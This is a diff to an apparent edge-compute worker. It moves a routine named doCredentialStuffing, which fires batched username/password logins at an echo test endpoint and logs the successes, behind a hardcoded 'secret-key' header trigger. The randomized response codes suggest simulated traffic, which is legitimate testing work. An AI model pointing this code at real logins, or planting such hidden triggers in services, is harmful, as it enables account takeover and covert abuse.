@@ -13,54 +13,62 @@ const usernames_passwords = [{"name":"Amity","guid":"260BA6F0-9784-CB9C-8EB5-76E
 
 async function handleRequest(event) {
 
-  // Iterate over each username and send a POST request
-  const fetchPromises = usernames_passwords.map(async usernames_password => {
-    // Generate a random number (200 or 401)
-    const number = getRandomInt(2) === 0 ? 200 : 401;
+  let req = event.request;
 
-    // Construct the JSON body
-    const jsonBody = JSON.stringify({
-      username: usernames_password.name,
-      password: usernames_password.guid,
-    });
-
-    // Send the HTTP POST request
-    const url = 'https://http.edgecompute.app/anything/login';
-    const reqHeaders = {
-      'Content-Type': 'application/json',
-      'endpoint': `status=${number}`
-    };
-
-    // Perform the POST request and check the response
-    const response = fetch(url, {
-      method: 'POST',
-      headers: reqHeaders,
-      body: jsonBody,
-      backend: 'origin_0',
-    });
-
-    return response
-  });
-
-  // Wait for all fetch requests to complete
-  const responses = await Promise.all(fetchPromises);
-
-  // Check the response codes and log the responses for those that are 200
-  responses.forEach(async response => {
-    if (response.status === 200) {
-      const responseBody = await response.json(); // assuming the server returns JSON
-      console.log('Login_success:', responseBody.body);
-    }
-    if (response.status === 401) {
-      const responseBody = await response.json(); // assuming the server returns JSON
-      // console.log('Login_failure:', responseBody);
-    }
-  });
-
+  if (req.headers.get("secret-key") == "mysecret"){
+    await doCredentialStuffing();
+  };
   return new Response("OK", { status: 200 });
 }
 
 // Helper function to generate a random integer, either 0 or 1
 function getRandomInt(max) {
   return Math.floor(Math.random() * Math.floor(max));
+}
+
+async function doCredentialStuffing(){
+    // Iterate over each username and send a POST request
+    const fetchPromises = usernames_passwords.map(async usernames_password => {
+      // Generate a random number (200 or 401)
+      const number = getRandomInt(2) === 0 ? 200 : 401;
+  
+      // Construct the JSON body
+      const jsonBody = JSON.stringify({
+        username: usernames_password.name,
+        password: usernames_password.guid,
+      });
+  
+      // Send the HTTP POST request
+      const url = 'https://http.edgecompute.app/anything/login';
+      const reqHeaders = {
+        'Content-Type': 'application/json',
+        'endpoint': `status=${number}`
+      };
+  
+      // Perform the POST request and check the response
+      const response = fetch(url, {
+        method: 'POST',
+        headers: reqHeaders,
+        body: jsonBody,
+        backend: 'origin_0',
+      });
+  
+      return response
+    });
+  
+    // Wait for all fetch requests to complete
+    const responses = await Promise.all(fetchPromises);
+  
+    // Check the response codes and log the responses for those that are 200
+    responses.forEach(async response => {
+      if (response.status === 200) {
+        const responseBody = await response.json(); // assuming the server returns JSON
+        console.log('Login_success:', responseBody.body);
+      }
+      if (response.status === 401) {
+        const responseBody = await response.json(); // assuming the server returns JSON
+        // console.log('Login_failure:', responseBody);
+      }
+    });
+
 }
